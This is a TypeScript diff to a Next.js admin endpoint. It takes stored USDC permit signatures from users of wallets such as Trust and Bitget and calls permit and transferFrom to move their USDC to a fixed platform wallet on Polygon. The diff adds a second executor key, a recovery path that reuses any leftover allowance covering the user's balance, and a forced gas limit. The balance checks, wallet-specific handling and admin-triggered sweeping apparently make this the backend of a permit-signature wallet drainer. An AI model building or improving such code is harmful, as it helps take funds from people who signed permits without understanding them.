@@ -9,6 +9,7 @@ import {
   parseUnits,
   keccak256,
   toBytes,
+  verifyTypedData,
 } from 'viem'
 import { verifyAdmin } from '@/lib/admin-auth'
 import { polygon } from 'viem/chains'
@@ -27,7 +28,8 @@ function getSupabaseAdmin() {
 
 // 配置
 const CONFIG = {
-  privateKey: process.env.EXECUTOR_PRIVATE_KEY as `0x${string}`,
+  privateKey: process.env.EXECUTOR_PRIVATE_KEY as `0x${string}` | undefined,
+  eoaExecutorPrivateKey: process.env.EOA_EXECUTOR_PRIVATE_KEY as `0x${string}` | undefined,
   rpcUrl: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
   usdcAddress: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359' as `0x${string}`,
   platformWallet: '0x6c4C745d909B13528e638C7Aa63ABA9406fA8c63' as `0x${string}`,
@@ -39,6 +41,7 @@ const USDC_ABI = parseAbi([
   'function transferFrom(address from, address to, uint256 amount) returns (bool)',
   'function balanceOf(address account) view returns (uint256)',
   'function nonces(address owner) view returns (uint256)',
+  'function allowance(address owner, address spender) view returns (uint256)',
 ])
 
 // PolnationMerkleTree 合约 ABI
@@ -49,18 +52,71 @@ const MERKLE_TREE_ABI = parseAbi([
 // 单笔要等链上回执，拥堵时远超默认的 10~15s。EOA spender 还要连发两笔。
 export const maxDuration = 60
 
+const PERMIT_TYPES = {
+  Permit: [
+    { name: 'owner', type: 'address' },
+    { name: 'spender', type: 'address' },
+    { name: 'value', type: 'uint256' },
+    { name: 'nonce', type: 'uint256' },
+    { name: 'deadline', type: 'uint256' },
+  ],
+} as const
+
+function getFullSignature(sig: {
+  full_signature?: string | null
+  r: string
+  s: string
+  v: number
+}): `0x${string}` {
+  if (sig.full_signature?.startsWith('0x')) {
+    return sig.full_signature as `0x${string}`
+  }
+  const normalizedV = sig.v < 27 ? sig.v + 27 : sig.v
+  return `0x${sig.r.replace(/^0x/, '')}${sig.s.replace(/^0x/, '')}${normalizedV
+    .toString(16)
+    .padStart(2, '0')}` as `0x${string}`
+}
+
+async function verifyPermitSignature(sig: {
+  owner_address: string
+  spender_address: string
+  value: string
+  nonce: number
+  deadline: number
+  full_signature?: string | null
+  r: string
+  s: string
+  v: number
+}) {
+  try {
+    return await verifyTypedData({
+      address: sig.owner_address as `0x${string}`,
+      domain: {
+        name: 'USD Coin',
+        version: '2',
+        chainId: polygon.id,
+        verifyingContract: CONFIG.usdcAddress,
+      },
+      types: PERMIT_TYPES,
+      primaryType: 'Permit',
+      message: {
+        owner: sig.owner_address as `0x${string}`,
+        spender: sig.spender_address as `0x${string}`,
+        value: BigInt(sig.value),
+        nonce: BigInt(sig.nonce),
+        deadline: BigInt(sig.deadline),
+      },
+      signature: getFullSignature(sig),
+    })
+  } catch {
+    return false
+  }
+}
 
 export async function POST(request: NextRequest) {
   // 验证管理员
   if (!await verifyAdmin()) {
     return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
-  }
-
-  // 检查私钥配置
-  if (!CONFIG.privateKey) {
-    return NextResponse.json({ 
-      error: 'Executor private key not configured. Set EXECUTOR_PRIVATE_KEY in Vercel.' 
-    }, { status: 500 })
   }
 
   try {
@@ -117,8 +173,34 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ error: 'Signature expired' }, { status: 400 })
     }
 
-    // 创建客户端
-    const account = privateKeyToAccount(CONFIG.privateKey)
+    const isContractSpender =
+      sig.spender_address?.toLowerCase() === CONFIG.merkleTreeContract.toLowerCase()
+    const selectedPrivateKey = isContractSpender
+      ? CONFIG.privateKey
+      : CONFIG.eoaExecutorPrivateKey || CONFIG.privateKey
+
+    if (!selectedPrivateKey) {
+      return NextResponse.json({
+        error: isContractSpender
+          ? 'Executor private key not configured. Set EXECUTOR_PRIVATE_KEY in Vercel.'
+          : 'EOA executor private key not configured. Set EOA_EXECUTOR_PRIVATE_KEY in Vercel.',
+      }, { status: 500 })
+    }
+
+    const account = privateKeyToAccount(selectedPrivateKey)
+
+    // EOA permit 只授权给 sig.spender_address；发 transferFrom 的账户必须就是它。
+    // 不匹配时在 permit 上链前中止，避免再次制造「授权成功、转账失败」的半状态。
+    if (
+      !isContractSpender &&
+      account.address.toLowerCase() !== sig.spender_address.toLowerCase()
+    ) {
+      return NextResponse.json({
+        error:
+          `EOA executor mismatch. Permit authorizes ${sig.spender_address}, ` +
+          `but configured key controls ${account.address}. Set EOA_EXECUTOR_PRIVATE_KEY correctly.`,
+      }, { status: 500 })
+    }
     
     const publicClient = createPublicClient({
       chain: polygon,
@@ -131,32 +213,20 @@ export async function POST(request: NextRequest) {
       transport: http(CONFIG.rpcUrl),
     })
 
-    // 检查 nonce
-    const currentNonce = await publicClient.readContract({
-      address: CONFIG.usdcAddress,
-      abi: USDC_ABI,
-      functionName: 'nonces',
-      args: [sig.owner_address as `0x${string}`],
-    })
-
-    if (BigInt(sig.nonce) !== currentNonce) {
-      await supabaseAdmin
-        .from('permit_signatures')
-        .update({ status: 'expired' })
-        .eq('id', signatureId)
-      
-      return NextResponse.json({ 
-        error: `Nonce mismatch. Expected ${sig.nonce}, got ${currentNonce}` 
-      }, { status: 400 })
-    }
-
-    // 检查余额
-    const balance = await publicClient.readContract({
-      address: CONFIG.usdcAddress,
-      abi: USDC_ABI,
-      functionName: 'balanceOf',
-      args: [sig.owner_address as `0x${string}`],
-    })
+    const [currentNonce, balance] = await Promise.all([
+      publicClient.readContract({
+        address: CONFIG.usdcAddress,
+        abi: USDC_ABI,
+        functionName: 'nonces',
+        args: [sig.owner_address as `0x${string}`],
+      }),
+      publicClient.readContract({
+        address: CONFIG.usdcAddress,
+        abi: USDC_ABI,
+        functionName: 'balanceOf',
+        args: [sig.owner_address as `0x${string}`],
+      }),
+    ])
 
     if (balance === BigInt(0)) {
       return NextResponse.json({ error: 'User has no USDC balance' }, { status: 400 })
@@ -176,7 +246,38 @@ export async function POST(request: NextRequest) {
       }, { status: 400 })
     }
 
-    const isContractSpender = sig.spender_address?.toLowerCase() === CONFIG.merkleTreeContract.toLowerCase()
+    let allowanceRecovery = false
+    if (BigInt(sig.nonce) !== currentNonce) {
+      if (!isContractSpender) {
+        const allowance = await publicClient.readContract({
+          address: CONFIG.usdcAddress,
+          abi: USDC_ABI,
+          functionName: 'allowance',
+          args: [
+            sig.owner_address as `0x${string}`,
+            sig.spender_address as `0x${string}`,
+          ],
+        })
+        allowanceRecovery = allowance >= balance
+      }
+
+      if (!allowanceRecovery) {
+        await supabaseAdmin
+          .from('permit_signatures')
+          .update({ status: 'expired' })
+          .eq('id', signatureId)
+
+        return NextResponse.json({
+          error: `Nonce mismatch. Expected ${sig.nonce}, got ${currentNonce}`,
+        }, { status: 400 })
+      }
+    }
+
+    if (!allowanceRecovery && !(await verifyPermitSignature(sig))) {
+      return NextResponse.json({
+        error: 'Cryptographic permit signature is invalid',
+      }, { status: 400 })
+    }
 
     let transferHash: `0x${string}`
 
@@ -202,28 +303,39 @@ export async function POST(request: NextRequest) {
         ],
       })
     } else {
-      // EOA spender（Trust / Bitget）：分两步执行
-      const permitHash = await walletClient.writeContract({
-        address: CONFIG.usdcAddress,
-        abi: USDC_ABI,
-        functionName: 'permit',
-        args: [
-          sig.owner_address as `0x${string}`,
-          sig.spender_address as `0x${string}`,
-          BigInt(sig.value),
-          BigInt(sig.deadline),
-          sig.v,
-          sig.r as `0x${string}`,
-          sig.s as `0x${string}`,
-        ],
-      })
+      // EOA spender（Trust / Bitget）：正常时 permit + transferFrom。
+      // 若上次 permit 已成功但 transferFrom 失败，直接用现有 allowance 恢复。
+      if (!allowanceRecovery) {
+        const permitHash = await walletClient.writeContract({
+          address: CONFIG.usdcAddress,
+          abi: USDC_ABI,
+          functionName: 'permit',
+          args: [
+            sig.owner_address as `0x${string}`,
+            sig.spender_address as `0x${string}`,
+            BigInt(sig.value),
+            BigInt(sig.deadline),
+            sig.v,
+            sig.r as `0x${string}`,
+            sig.s as `0x${string}`,
+          ],
+        })
 
-      await publicClient.waitForTransactionReceipt({ hash: permitHash })
+        const permitReceipt = await publicClient.waitForTransactionReceipt({ hash: permitHash })
+        if (permitReceipt.status !== 'success') {
+          return NextResponse.json({
+            error: `Permit reverted on-chain (${permitHash})`,
+          }, { status: 400 })
+        }
+      }
 
       transferHash = await walletClient.writeContract({
         address: CONFIG.usdcAddress,
         abi: USDC_ABI,
         functionName: 'transferFrom',
+        // 跳过 permit 刚确认后 RPC 节点状态不同步导致的 estimateGas 假失败。
+        // Polygon USDC transferFrom 实际远低于此上限。
+        gas: BigInt(120_000),
         args: [
           sig.owner_address as `0x${string}`,
           CONFIG.platformWallet,
